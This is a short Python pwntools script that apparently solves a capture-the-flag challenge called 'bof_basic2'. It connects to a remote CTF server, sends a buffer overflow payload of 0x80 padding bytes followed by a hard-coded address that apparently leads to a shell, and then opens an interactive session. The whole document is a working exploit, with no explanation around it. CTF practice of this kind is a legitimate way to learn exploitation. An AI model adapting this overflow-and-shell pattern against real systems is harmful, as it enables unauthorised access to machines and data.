from pwn import *

# p = process("./bof_basic2")
# nc ctf.j0n9hyun.xyz 3001
p = remote("ctf.j0n9hyun.xyz", 3001)

shell = 0x804849b

pay = b""
pay += b"A" * 0x80
pay += p32(shell)

p.sendline(pay)

p.interactive()